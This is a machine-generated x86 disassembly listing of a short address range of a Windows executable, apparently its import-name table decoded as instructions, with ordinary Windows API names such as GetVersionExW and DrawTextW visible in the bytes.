  4287ca:	add    al,BYTE PTR [eax]
  4287cc:	sbb    al,0x90
  4287ce:	add    al,BYTE PTR [eax]
  4287d0:	sub    BYTE PTR [eax-0x6fc5fffe],dl
  4287d6:	add    al,BYTE PTR [eax]
  4287d8:	dec    edx
  4287d9:	nop
  4287da:	add    al,BYTE PTR [eax]
  4287dc:	pop    esp
  4287dd:	nop
  4287de:	add    al,BYTE PTR [eax]
  4287e0:	push   0xffffff90
  4287e2:	add    al,BYTE PTR [eax]
  4287e4:	jl     0x428776
  4287e6:	add    al,BYTE PTR [eax]
  4287e8:	xchg   edx,eax
  4287e9:	nop
  4287ea:	add    al,BYTE PTR [eax]
  4287ec:	scas   al,BYTE PTR es:[edi]
  4287ed:	nop
  4287ee:	add    al,BYTE PTR [eax]
  4287f0:	les    edx,FWORD PTR [eax-0x6f29fffe]
  4287f6:	add    al,BYTE PTR [eax]
  4287f8:	call   0xfa428a8d
  4287fd:	nop
  4287fe:	add    al,BYTE PTR [eax]
  428800:	push   cs
  428801:	xchg   ecx,eax
  428802:	add    al,BYTE PTR [eax]
  428804:	sbb    al,0x91
  428806:	add    al,BYTE PTR [eax]
  428808:	sub    al,0x91
  42880a:	add    al,BYTE PTR [eax]
  42880c:	cmp    BYTE PTR [ecx-0x6eb9fffe],dl
  428812:	add    al,BYTE PTR [eax]
  428814:	pop    esi
  428815:	xchg   ecx,eax
  428816:	add    al,BYTE PTR [eax]
  428818:	outs   dx,BYTE PTR ds:[esi]
  428819:	xchg   ecx,eax
  42881a:	add    al,BYTE PTR [eax]
  42881c:	jl     0x4287af
  42881e:	add    al,BYTE PTR [eax]
  428820:	nop
  428821:	xchg   ecx,eax
  428822:	add    al,BYTE PTR [eax]
  428824:	sahf   
  428825:	xchg   ecx,eax
  428826:	add    al,BYTE PTR [eax]
  428828:	stos   BYTE PTR es:[edi],al
  428829:	xchg   ecx,eax
  42882a:	add    al,BYTE PTR [eax]
  42882c:	mov    esp,0xce000291
  428831:	xchg   ecx,eax
  428832:	add    al,BYTE PTR [eax]
  428834:	loopne 0x4287c7
  428836:	add    al,BYTE PTR [eax]
  428838:	not    BYTE PTR [ecx-0x6dfdfffe]
  42883e:	add    al,BYTE PTR [eax]
  428840:	adc    BYTE PTR [edx-0x6de3fffe],dl
  428846:	add    al,BYTE PTR [eax]
  428848:	sub    dl,BYTE PTR [edx-0x6dc1fffe]
  42884e:	add    al,BYTE PTR [eax]
  428850:	dec    edx
  428851:	xchg   edx,eax
  428852:	add    al,BYTE PTR [eax]
  428854:	pop    esi
  428855:	xchg   edx,eax
  428856:	add    al,BYTE PTR [eax]
  428858:	push   0xffffff92
  42885a:	add    al,BYTE PTR [eax]
  42885c:	jp     0x4287f0
  42885e:	add    al,BYTE PTR [eax]
  428860:	mov    BYTE PTR [edx-0x6d61fffe],dl
  428866:	add    al,BYTE PTR [eax]
  428868:	add    BYTE PTR [eax],al
  42886a:	add    BYTE PTR [eax],al
  42886c:	mov    dh,0x92
  42886e:	add    al,BYTE PTR [eax]
  428870:	les    edx,FWORD PTR [edx-0x6d29fffe]
  428876:	add    al,BYTE PTR [eax]
  428878:	out    dx,al
  428879:	xchg   edx,eax
  42887a:	add    al,BYTE PTR [eax]
  42887c:	add    BYTE PTR [ebx-0x6cedfffe],dl
  428882:	add    al,BYTE PTR [eax]
  428884:	sub    al,0x93
  428886:	add    al,BYTE PTR [eax]
  428888:	cmp    al,0x93
  42888a:	add    al,BYTE PTR [eax]
  42888c:	inc    esi
  42888d:	xchg   ebx,eax
  42888e:	add    al,BYTE PTR [eax]
  428890:	pop    eax
  428891:	xchg   ebx,eax
  428892:	add    al,BYTE PTR [eax]
  428894:	push   0x80000293
  428899:	xchg   ebx,eax
  42889a:	add    al,BYTE PTR [eax]
  42889c:	nop
  42889d:	xchg   ebx,eax
  42889e:	add    al,BYTE PTR [eax]
  4288a0:	mov    al,ds:0xb2000293
  4288a5:	xchg   ebx,eax
  4288a6:	add    al,BYTE PTR [eax]
  4288a8:	les    edx,FWORD PTR [ebx-0x6c2ffffe]
  4288ae:	add    al,BYTE PTR [eax]
  4288b0:	fcom   QWORD PTR [ebx-0x6c0dfffe]
  4288b6:	add    al,BYTE PTR [eax]
  4288b8:	push   es
  4288b9:	xchg   esp,eax
  4288ba:	add    al,BYTE PTR [eax]
  4288bc:	sbb    al,0x94
  4288be:	add    al,BYTE PTR [eax]
  4288c0:	xor    BYTE PTR [edx+eax*1+0x2944600],dl
  4288c7:	add    BYTE PTR [eax-0x6c],bl
  4288ca:	add    al,BYTE PTR [eax]
  4288cc:	fs xchg esp,eax
  4288ce:	add    al,BYTE PTR [eax]
  4288d0:	je     0x428866
  4288d2:	add    al,BYTE PTR [eax]
  4288d4:	xchg   edx,eax
  4288d5:	xchg   esp,eax
  4288d6:	add    al,BYTE PTR [eax]
  4288d8:	lods   al,BYTE PTR ds:[esi]
  4288d9:	xchg   esp,eax
  4288da:	add    al,BYTE PTR [eax]
  4288dc:	mov    edx,0xce000294
  4288e1:	xchg   esp,eax
  4288e2:	add    al,BYTE PTR [eax]
  4288e4:	out    0x94,al
  4288e6:	add    al,BYTE PTR [eax]
  4288e8:	cli    
  4288e9:	xchg   esp,eax
  4288ea:	add    al,BYTE PTR [eax]
  4288ec:	or     dl,BYTE PTR [ebp-0x6adffffe]
  4288f2:	add    al,BYTE PTR [eax]
  4288f4:	xor    dl,BYTE PTR [ebp-0x6abffffe]
  4288fa:	add    al,BYTE PTR [eax]
  4288fc:	push   edx
  4288fd:	xchg   ebp,eax
  4288fe:	add    al,BYTE PTR [eax]
  428900:	pusha  
  428901:	xchg   ebp,eax
  428902:	add    al,BYTE PTR [eax]
  428904:	jo     0x42889b
  428906:	add    al,BYTE PTR [eax]
  428908:	xchg   BYTE PTR [ebp-0x6a63fffe],dl
  42890e:	add    al,BYTE PTR [eax]
  428910:	lods   al,BYTE PTR ds:[esi]
  428911:	xchg   ebp,eax
  428912:	add    al,BYTE PTR [eax]
  428914:	ret    0x295
  428917:	add    ah,cl
  428919:	xchg   ebp,eax
  42891a:	add    al,BYTE PTR [eax]
  42891c:	ficom  WORD PTR [ebp-0x6a11fffe]
  428922:	add    al,BYTE PTR [eax]
  428924:	cld    
  428925:	xchg   ebp,eax
  428926:	add    al,BYTE PTR [eax]
  428928:	adc    dl,BYTE PTR [esi+0x2]
  42892e:	add    BYTE PTR [eax],al
  428930:	xchg   edx,eax
  428931:	add    edx,DWORD PTR [edx+0x74]
  428934:	ins    BYTE PTR es:[edi],dx
  428935:	dec    ecx
  428936:	outs   dx,BYTE PTR ds:[esi]
  428937:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  42893f:	jb     0x4289aa
  428941:	outs   dx,BYTE PTR ds:[esi]
  428942:	add    BYTE PTR [bp+0x74],ch
  428946:	fs ins BYTE PTR es:[edi],dx
  428948:	ins    BYTE PTR es:[edi],dx
  428949:	cs fs ins BYTE PTR es:[edi],dx
  42894c:	ins    BYTE PTR es:[edi],dx
  42894d:	add    BYTE PTR [ecx+0x74654701],dl
  428953:	push   esi
  428954:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  42895b:	dec    edi
  42895c:	jb     0x4289c5
  42895e:	inc    ebp
  42895f:	js     0x428961
  428961:	add    BYTE PTR [edx+0x74654701],cl
  428967:	push   esp
  428968:	gs js  0x4289df
  42896b:	inc    ebp
  42896c:	js     0x4289e2
  42896e:	outs   dx,BYTE PTR gs:[esi]
  428970:	je     0x4289c2
  428972:	outs   dx,DWORD PTR ds:[esi]
  428973:	imul   ebp,DWORD PTR [esi+0x74],0x1fb0057
  42897a:	push   ebx
  42897b:	gs je  0x4289d2
  42897e:	gs js  0x4289f5
  428981:	inc    ecx
  428982:	ins    BYTE PTR es:[edi],dx
  428983:	imul   esp,DWORD PTR [edi+0x6e],0xd50000
  42898a:	inc    ebp
  42898b:	js     0x428a01
  42898d:	push   esp
  42898e:	gs js  0x428a05
  428991:	dec    edi
  428992:	jne    0x428a08
  428994:	push   edi
  428995:	add    BYTE PTR [eax],dl
  428997:	add    dl,BYTE PTR [edx+esi*2+0x61]
  42899b:	outs   dx,BYTE PTR ds:[esi]
  42899c:	jae    0x428a0a
  42899e:	popa   
  42899f:	je     0x428a06
  4289a1:	inc    ebx
  4289a2:	push   0x65737261
  4289a7:	je     0x4289f2
  4289a9:	outs   dx,BYTE PTR ds:[esi]
  4289aa:	outs   dx,WORD PTR ds:[esi]
  4289ac:	add    BYTE PTR [eax],al
  4289ae:	pop    ss
  4289af:	add    dl,BYTE PTR [edi+0x69]
  4289b2:	fs outs dx,BYTE PTR gs:[esi]
  4289b5:	push   eax
  4289b6:	popa   
  4289b7:	je     0x428a21
  4289b9:	add    BYTE PTR [ebp+0x65724300],cl
  4289bf:	popa   
  4289c0:	je     0x428a27
  4289c2:	inc    ebx
  4289c3:	outs   dx,DWORD PTR ds:[esi]
  4289c4:	ins    DWORD PTR es:[edi],dx
  4289c5:	jo     0x428a28
  4289c7:	je     0x428a32
  4289c9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x44]
  4289cd:	inc    ebx
  4289ce:	add    BYTE PTR [eax],al
  4289d0:	mov    bh,0x1
  4289d2:	push   eax
  4289d3:	outs   dx,DWORD PTR ds:[esi]
  4289d4:	ins    BYTE PTR es:[edi],dx
  4289d5:	jns    0x428a43
  4289d7:	imul   ebp,DWORD PTR [esi+0x65],0x1940000
  4289de:	inc    edi
  4289df:	gs je  0x428a39
  4289e2:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4289e9:	addr16 inc ebp
  4289eb:	js     0x4289ed
  4289ed:	add    cl,ch
  4289ef:	add    DWORD PTR [ebx+0x65],edx
  4289f2:	je     0x428a40
  4289f4:	popa   
  4289f5:	jns    0x428a66
  4289f7:	jne    0x428a6d
  4289f9:	add    bl,dl
  4289fb:	add    DWORD PTR [ebx+0x65],edx
  4289fe:	je     0x428a41
  428a00:	bound  ebp,QWORD PTR [edi+0x72]
  428a03:	je     0x428a55
  428a05:	jb     0x428a76
  428a07:	arpl   WORD PTR [eax],ax
  428a09:	add    BYTE PTR [edx],cl
  428a0b:	add    dl,BYTE PTR [ebx+0x74]
  428a0e:	jb     0x428a75
  428a10:	je     0x428a75
  428a12:	push   0x69424944
  428a17:	je     0x428a8c
  428a19:	add    BYTE PTR [ebx+0x1],al
  428a1c:	inc    edi
  428a1d:	gs je  0x428a64
  428a20:	dec    ecx
  428a21:	inc    edx
  428a22:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x655301eb
  428a2a:	je     0x428a79
  428a2c:	popa   
  428a2d:	jo     0x428a7c
  428a2f:	outs   dx,DWORD PTR ds:[esi]
  428a30:	fs add BYTE PTR gs:[eax],al
  428a34:	daa    
  428a35:	add    DWORD PTR [edi+0x65],eax
  428a38:	je     0x428a7c
  428a3a:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  428a3e:	add    BYTE PTR gs:[ebx+0x66664f01],ah
  428a45:	jae    0x428aac
  428a47:	je     0x428a9b
  428a49:	outs   dx,BYTE PTR ds:[si]
  428a4b:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  428a52:	jo     0x428ac7
  428a54:	gs add ah,cl
  428a57:	add    DWORD PTR [ebx+0x63],edx
  428a5a:	popa   
  428a5b:	ins    BYTE PTR es:[edi],dx
  428a5c:	gs push edi
  428a5e:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428a65:	je     0x428aac
  428a67:	js     0x428a69
  428a69:	add    BYTE PTR [edx+0x1],bh
  428a6c:	inc    edi
  428a6d:	gs je  0x428ac3
  428a70:	je     0x428ae1
  428a72:	arpl   WORD PTR [ebx+0x4f],bp
  428a75:	bound  ebp,QWORD PTR [edx+0x65]
  428a78:	arpl   WORD PTR [eax+eax*1+0x0],si
  428a7c:	call   0x5465:0x6e694c01
  428a83:	outs   dx,DWORD PTR ds:[esi]
  428a84:	add    BYTE PTR [eax],al
  428a86:	mov    dh,0x1
  428a88:	push   eax
  428a89:	outs   dx,DWORD PTR ds:[esi]
  428a8a:	ins    BYTE PTR es:[edi],dx
  428a8b:	jns    0x428af4
  428a8d:	outs   dx,DWORD PTR ds:[esi]
  428a8e:	outs   dx,BYTE PTR ds:[esi]
  428a8f:	add    BYTE PTR [esi+0x1],bh
  428a92:	inc    edi
  428a93:	gs je  0x428aea
  428a96:	gs js  0x428b0d
  428a99:	inc    ecx
  428a9a:	ins    BYTE PTR es:[edi],dx
  428a9b:	imul   esp,DWORD PTR [edi+0x6e],0x18c0000
  428aa2:	inc    edi
  428aa3:	gs je  0x428afa
  428aa6:	gs js  0x428b1d
  428aa9:	inc    esi
  428aaa:	popa   
  428aab:	arpl   WORD PTR [ebp+0x57],sp
  428aae:	add    BYTE PTR [eax],al
  428ab0:	mov    ebx,0x61655201
  428ab5:	ins    BYTE PTR es:[edi],dx
  428ab6:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428abd:	je     0x428b33
  428abf:	add    BYTE PTR gs:[eax],al
  428ac2:	mov    DWORD PTR [ecx],0x69736552
  428ac8:	jp     0x428b2f
  428aca:	push   eax
  428acb:	popa   
  428acc:	ins    BYTE PTR es:[edi],dx
  428acd:	gs je  0x428b44
  428ad0:	add    BYTE PTR gs:[ecx+0x6d6f4300],al
  428ad7:	bound  ebp,QWORD PTR [ecx+0x6e]
  428ada:	gs push edx
  428adc:	outs   dx,BYTE PTR ds:[si]
  428ade:	add    BYTE PTR [eax],al
  428ae0:	push   cs
  428ae1:	add    dl,BYTE PTR [ebp+eiz*2+0x78]
  428ae5:	je     0x428b36
  428ae7:	jne    0x428b5d
  428ae9:	inc    ecx
  428aea:	add    BYTE PTR [eax],al
  428aec:	test   DWORD PTR [ecx],0x52746553
  428af2:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428af7:	outs   dx,BYTE PTR ds:[esi]
  428af8:	add    BYTE PTR [eax],al
  428afa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428afb:	add    BYTE PTR [ebx+0x72],al
  428afe:	gs popa 
  428b00:	je     0x428b67
  428b02:	push   eax
  428b03:	popa   
  428b04:	ins    BYTE PTR es:[edi],dx
  428b05:	gs je  0x428b7c
  428b08:	add    BYTE PTR gs:[ecx+eax*1],ah
  428b0c:	inc    edi
  428b0d:	gs je  0x428b52
  428b10:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  428b18:	jae    0x428b1a
  428b1a:	mov    DWORD PTR [eax],0x6d756e45
  428b20:	inc    esi
  428b21:	outs   dx,DWORD PTR ds:[esi]
  428b22:	outs   dx,BYTE PTR ds:[esi]
  428b23:	je     0x428b98
  428b25:	push   edi
  428b26:	add    BYTE PTR [eax],al
  428b28:	lods   al,BYTE PTR ds:[esi]
  428b29:	add    BYTE PTR [ebx+0x72],al
  428b2c:	gs popa 
  428b2e:	je     0x428b95
  428b30:	push   edx
  428b31:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428b36:	outs   dx,BYTE PTR ds:[esi]
  428b37:	dec    ecx
  428b38:	outs   dx,BYTE PTR ds:[esi]
  428b39:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  428b41:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428b45:	gs inc esp
  428b47:	inc    esp
  428b48:	inc    ecx
  428b49:	add    ch,dl
  428b4b:	add    DWORD PTR [ebx+0x65],edx
  428b4e:	je     0x428b92
  428b50:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  428b58:	jae    0x428b5a
  428b5a:	mov    BYTE PTR [eax],al
  428b5c:	inc    ebx
  428b5d:	jb     0x428bc4
  428b5f:	popa   
  428b60:	je     0x428bc7
  428b62:	inc    edx
  428b63:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  428b6b:	imul   esi,DWORD PTR [edx+0x65],0x7463
  428b72:	mov    es,WORD PTR [ecx]
  428b74:	inc    edi
  428b75:	gs je  0x428bcc
  428b78:	gs js  0x428bef
  428b7b:	dec    ebp
  428b7c:	gs je  0x428bf1
  428b7f:	imul   esp,DWORD PTR [ebx+0x73],0x1da0057
  428b86:	push   ebx
  428b87:	gs je  0x428bcc
  428b8a:	jb     0x428c01
  428b8c:	jae    0x428bf6
  428b8e:	dec    edi
  428b8f:	jb     0x428bf8
  428b91:	inc    ebp
  428b92:	js     0x428b94
  428b94:	mov    esp,0x63655201
  428b99:	je     0x428be4
  428b9b:	outs   dx,BYTE PTR ds:[esi]
  428b9c:	push   edx
  428b9d:	imul   ebp,DWORD PTR gs:[bx+0x6e],0xcd0000
  428ba6:	inc    ebp
  428ba7:	jae    0x428c0c
  428ba9:	popa   
  428baa:	jo     0x428c11
  428bac:	add    BYTE PTR [eax],al
  428bae:	scas   eax,DWORD PTR es:[edi]
  428baf:	add    DWORD PTR [eax+0x6f],edx
  428bb2:	ins    BYTE PTR es:[edi],dx
  428bb3:	jns    0x428bf7
  428bb5:	gs jp  0x428c21
  428bb8:	gs jb  0x428bbb
  428bbb:	add    BYTE PTR [ebx+0x65724300],ch
  428bc1:	popa   
  428bc2:	je     0x428c29
  428bc4:	push   edx
  428bc5:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428bca:	outs   dx,BYTE PTR ds:[esi]
  428bcb:	add    BYTE PTR [edi+0x65724300],cl
  428bd1:	popa   
  428bd2:	je     0x428c39
  428bd4:	inc    esp
  428bd5:	inc    ebx
  428bd6:	push   edi
  428bd7:	add    BYTE PTR ds:0x74654701,bh
  428bdd:	inc    ebx
  428bde:	jne    0x428c52
  428be0:	jb     0x428c47
  428be2:	outs   dx,BYTE PTR ds:[esi]
  428be3:	je     0x428c34
  428be5:	bound  ebp,QWORD PTR [edx+0x65]
  428be8:	arpl   WORD PTR [eax+eax*1+0x0],si
  428bec:	inc    edi
  428bed:	inc    esp
  428bee:	dec    ecx
  428bef:	xor    esi,DWORD PTR [edx]
  428bf1:	cs fs ins BYTE PTR es:[edi],dx
  428bf4:	ins    BYTE PTR es:[edi],dx
  428bf5:	add    BYTE PTR [ebx+0x6f],ah
  428bf8:	outs   dx,BYTE PTR ds:[esi]
  428bf9:	jae    0x428c6a
  428bfb:	ins    BYTE PTR es:[edi],dx
  428bfc:	gs cs fs ins BYTE PTR es:[edi],dx
  428c00:	ins    BYTE PTR es:[edi],dx
  428c01:	add    BYTE PTR [ecx],bh
  428c03:	add    BYTE PTR [ebx+0x68],al
  428c06:	popa   
  428c07:	jb     0x428c5e
  428c09:	jo     0x428c7b
  428c0b:	gs jb  0x428c65
  428c0e:	add    BYTE PTR [eax],al
  428c10:	dec    esi
  428c11:	add    dl,BYTE PTR [ebx+0x65]
  428c14:	je     0x428c63
  428c16:	outs   dx,BYTE PTR gs:[esi]
  428c18:	jne    0x428c63
  428c1a:	je     0x428c81
  428c1c:	ins    DWORD PTR es:[edi],dx
  428c1d:	dec    ecx
  428c1e:	outs   dx,BYTE PTR ds:[esi]
  428c1f:	outs   dx,WORD PTR ds:[esi]
  428c21:	push   edi
  428c22:	add    BYTE PTR [eax],al
  428c24:	scas   al,BYTE PTR es:[edi]
  428c25:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  428c29:	fs inc ebx
  428c2b:	jne    0x428c9f
  428c2d:	jae    0x428c9e
  428c2f:	jb     0x428c88
  428c31:	add    BYTE PTR [eax+0x0],bl
  428c34:	inc    ebx
  428c35:	jb     0x428c9c
  428c37:	popa   
  428c38:	je     0x428c9f
  428c3a:	inc    esp
  428c3b:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  428c42:	jb     0x428ca5
  428c44:	ins    DWORD PTR es:[edi],dx
  428c45:	inc    ecx
  428c46:	add    BYTE PTR [eax],al
  428c48:	popf   
  428c49:	add    DWORD PTR [ecx+0x73],ecx
  428c4c:	dec    ebp
  428c4d:	outs   dx,BYTE PTR gs:[esi]
  428c4f:	jne    0x428c51
  428c51:	add    BYTE PTR [eax+0x1],ch
  428c54:	inc    edi
  428c55:	gs je  0x428caf
  428c58:	imul   ebp,DWORD PTR [esi+0x64],0x6200776f
  428c5f:	add    DWORD PTR [edi+0x65],eax
  428c62:	je     0x428cb8
  428c64:	outs   dx,DWORD PTR ds:[esi]
  428c65:	jo     0x428cbe
  428c67:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428c6e:	mov    ds:0x57734901,eax
  428c73:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  428c7a:	jae    0x428ce5
  428c7c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  428c80:	sub    eax,0x74654701
  428c85:	dec    ebp
  428c86:	outs   dx,BYTE PTR gs:[esi]
  428c88:	jne    0x428ccd
  428c8a:	push   0x4d6b6365
  428c8f:	popa   
  428c90:	jb     0x428cfd
  428c92:	inc    esp
  428c93:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  428c9a:	outs   dx,BYTE PTR ds:[esi]
  428c9b:	jae    0x428c9d
  428c9d:	add    BYTE PTR [edx],bl
  428c9f:	add    BYTE PTR [ebx+0x61],al
  428ca2:	ins    BYTE PTR es:[edi],dx
  428ca3:	ins    BYTE PTR es:[edi],dx
  428ca4:	push   edi
  428ca5:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  428cac:	outs   dx,DWORD PTR ds:[esi]
  428cad:	arpl   WORD PTR [ecx+0x0],ax
  428cb0:	repz add BYTE PTR [edi+0x65],al
  428cb4:	je     0x428cf9
  428cb6:	popa   
  428cb7:	jb     0x428d1e
  428cb9:	je     0x428d0b
  428cbb:	outs   dx,DWORD PTR ds:[esi]
  428cbc:	jae    0x428cbe
  428cbe:	ret    0x7702
  428cc1:	jbe    0x428d36
  428cc3:	jo     0x428d37
  428cc5:	imul   ebp,DWORD PTR [esi+0x74],0x5766
  428ccc:	test   al,0x1
  428cce:	dec    esp
  428ccf:	outs   dx,DWORD PTR ds:[esi]
  428cd0:	popa   
  428cd1:	fs inc ecx
  428cd3:	arpl   WORD PTR [ebx+0x65],sp
  428cd6:	ins    BYTE PTR es:[edi],dx
  428cd7:	gs jb  0x428d3b
  428cda:	je     0x428d4b
  428cdc:	jb     0x428d51
  428cde:	push   edi
  428cdf:	add    BYTE PTR [edi],cl
  428ce1:	add    BYTE PTR [edx+0x72],al
  428ce4:	imul   ebp,DWORD PTR [esi+0x67],0x646e6957
  428ceb:	outs   dx,DWORD PTR ds:[esi]
  428cec:	ja     0x428d42
  428cee:	outs   dx,DWORD PTR ds:[esi]
  428cef:	push   esp
  428cf0:	outs   dx,DWORD PTR ds:[esi]
  428cf1:	jo     0x428cf3
  428cf3:	add    BYTE PTR [ecx+0x66654400],cl
  428cf9:	inc    esi
  428cfa:	jb     0x428d5d
  428cfc:	ins    DWORD PTR es:[edi],dx
  428cfd:	gs push eax
  428cff:	jb     0x428d70
  428d01:	arpl   WORD PTR [ecx+0x0],ax
  428d04:	mov    ebx,0x61724400
  428d09:	ja     0x428d5f
  428d0b:	gs js  0x428d82
  428d0e:	inc    ebp
  428d0f:	js     0x428d68
  428d11:	add    BYTE PTR [edx+0x666e4901],al
  428d17:	ins    BYTE PTR es:[edi],dx
  428d18:	popa   
  428d19:	je     0x428d80
  428d1b:	push   edx
  428d1c:	arpl   WORD PTR gs:[eax+eax*1+0x5],si
  428d21:	add    dl,BYTE PTR [edx+0x65]
  428d24:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  428d2c:	popa   
  428d2d:	jae    0x428da2
  428d2f:	push   edi
  428d30:	add    BYTE PTR [eax],al
  428d32:	inc    ebp
  428d33:	add    dl,BYTE PTR [ebx+0x65]
  428d36:	je     0x428d84
  428d38:	popa   
  428d39:	jae    0x428daf
  428d3b:	inc    ebp
  428d3c:	jb     0x428db0
  428d3e:	outs   dx,DWORD PTR ds:[esi]
  428d3f:	jb     0x428d86
  428d41:	js     0x428d43
  428d43:	add    BYTE PTR [edx+0x43734901],dl
  428d49:	push   0x70557261
  428d4e:	jo     0x428db5
  428d50:	jb     0x428d93
  428d52:	add    BYTE PTR [eax],al
  428d54:	inc    ebx
  428d55:	add    BYTE PTR [ebx+0x6c],al
  428d58:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  428d5f:	arpl   WORD PTR [edx+0x65],si
  428d62:	outs   dx,BYTE PTR gs:[esi]
  428d64:	add    BYTE PTR [eax],al
  428d66:	push   ecx
  428d67:	add    dl,BYTE PTR [ebx+0x65]
  428d6a:	je     0x428dbc
  428d6c:	popa   
  428d6d:	jb     0x428dd4
  428d6f:	outs   dx,BYTE PTR ds:[esi]
  428d70:	je     0x428d72
  428d72:	xchg   ecx,eax
  428d73:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428d77:	arpl   WORD PTR [ebx+0x50],bp
  428d7a:	outs   dx,DWORD PTR ds:[esi]
  428d7b:	jo     0x428df2
  428d7d:	jo     0x428dcc
  428d7f:	outs   dx,BYTE PTR gs:[esi]
  428d81:	jne    0x428dc8
  428d83:	js     0x428d85
  428d85:	add    BYTE PTR [edx],ah
  428d87:	add    DWORD PTR [edi+0x65],eax
  428d8a:	je     0x428dd7
  428d8c:	gs jns 0x428df1
  428d8f:	outs   dx,DWORD PTR ds:[esi]
  428d90:	popa   
  428d91:	jb     0x428df7
  428d93:	dec    esp
  428d94:	popa   
  428d95:	jns    0x428e06
  428d97:	jne    0x428e0d
  428d99:	add    bl,bh
  428d9b:	add    BYTE PTR [edi+0x65],al
  428d9e:	je     0x428de3
  428da0:	ins    BYTE PTR es:[edi],dx
  428da1:	popa   
  428da2:	jae    0x428e17
  428da4:	dec    esi
  428da5:	popa   
  428da6:	ins    DWORD PTR es:[edi],dx
  428da7:	gs push edi
  428da9:	add    ch,bl
  428dab:	add    BYTE PTR [ebp+0x71],al
  428dae:	jne    0x428e11
  428db0:	ins    BYTE PTR es:[edi],dx
  428db1:	push   edx
  428db2:	arpl   WORD PTR gs:[eax+eax*1+0x32],si
  428db7:	add    dl,BYTE PTR [ebx+0x65]
  428dba:	je     0x428dff
  428dbc:	popa   
  428dbd:	jb     0x428e24
  428dbf:	je     0x428e11
  428dc1:	outs   dx,DWORD PTR ds:[esi]
  428dc2:	jae    0x428dc4
  428dc4:	and    al,0x0
  428dc6:	inc    ebx
  428dc7:	push   0x65676e61
  428dcc:	dec    ebp
  428dcd:	outs   dx,BYTE PTR gs:[esi]
  428dcf:	jne    0x428e28
  428dd1:	add    BYTE PTR [eax+0x73654400],bl
  428dd7:	je     0x428e4b
  428dd9:	outs   dx,DWORD PTR ds:[esi]
  428dda:	jns    0x428e33
  428ddc:	imul   ebp,DWORD PTR [esi+0x64],0xf500776f
  428de3:	add    DWORD PTR [eax+0x6f],edx
  428de6:	jae    0x428e5c
  428de8:	push   esp
  428de9:	push   0x64616572
  428dee:	dec    ebp
  428def:	gs jae 0x428e65
  428df2:	popa   
  428df3:	addr16 gs push edi
  428df6:	add    BYTE PTR [eax],al
  428df8:	push   edi
  428df9:	add    dl,BYTE PTR [ebx+0x65]
  428dfc:	je     0x428e4e
  428dfe:	jb     0x428e6f
  428e00:	jo     0x428e59
  428e02:	add    BYTE PTR [eax],al
  428e04:	mov    al,0x1
  428e06:	dec    esp
  428e07:	outs   dx,DWORD PTR ds:[esi]
  428e08:	popa   
  428e09:	fs dec ecx
  428e0b:	arpl   WORD PTR [edi+0x6e],bp
  428e0e:	push   edi
  428e0f:	add    bl,bh
  428e11:	add    DWORD PTR [eax+0x74],edx
  428e14:	dec    ecx
  428e15:	outs   dx,BYTE PTR ds:[esi]
  428e16:	push   edx
  428e17:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428e1c:	dec    edx
  428e1d:	add    dl,BYTE PTR [ebx+0x65]
  428e20:	je     0x428e6f
  428e22:	outs   dx,BYTE PTR gs:[esi]
  428e24:	jne    0x428e6a
  428e26:	gs popaw 
  428e29:	jne    0x428e97
  428e2b:	je     0x428e76
  428e2d:	je     0x428e94
  428e2f:	ins    DWORD PTR es:[edi],dx
  428e30:	add    BYTE PTR [eax],al
  428e32:	sti    
  428e33:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428e37:	arpl   WORD PTR [ebx+0x50],bp
  428e3a:	outs   dx,DWORD PTR ds:[esi]
  428e3b:	jo     0x428eb2
  428e3d:	jo     0x428e8c
  428e3f:	outs   dx,BYTE PTR gs:[esi]
  428e41:	jne    0x428e43
  428e43:	add    BYTE PTR [ebp+0x64705502],ah
  428e49:	popa   
  428e4a:	je     0x428eb1
  428e4c:	push   edi
  428e4d:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428e54:	push   ss
  428e55:	add    dl,BYTE PTR [edx+0x65]
  428e58:	ins    DWORD PTR es:[edi],dx
  428e59:	outs   dx,DWORD PTR ds:[esi]
  428e5a:	jbe    0x428ec1
  428e5c:	dec    ebp
  428e5d:	outs   dx,BYTE PTR gs:[esi]
  428e5f:	jne    0x428e61
  428e61:	add    BYTE PTR [edx+0x61724400],dh
  428e67:	ja     0x428eaf
  428e69:	jb     0x428ecc
  428e6b:	ins    DWORD PTR es:[edi],dx
  428e6c:	gs inc ebx
  428e6e:	outs   dx,DWORD PTR ds:[esi]
  428e6f:	outs   dx,BYTE PTR ds:[esi]
  428e70:	je     0x428ee4
  428e72:	outs   dx,DWORD PTR ds:[esi]
  428e73:	ins    BYTE PTR es:[edi],dx
  428e74:	add    BYTE PTR [eax],al
  428e76:	mov    dl,0x1
  428e78:	dec    esp
  428e79:	outs   dx,DWORD PTR ds:[esi]
  428e7a:	popa   
  428e7b:	fs dec ecx
  428e7d:	ins    DWORD PTR es:[edi],dx
  428e7e:	popa   
  428e7f:	addr16 gs push edi
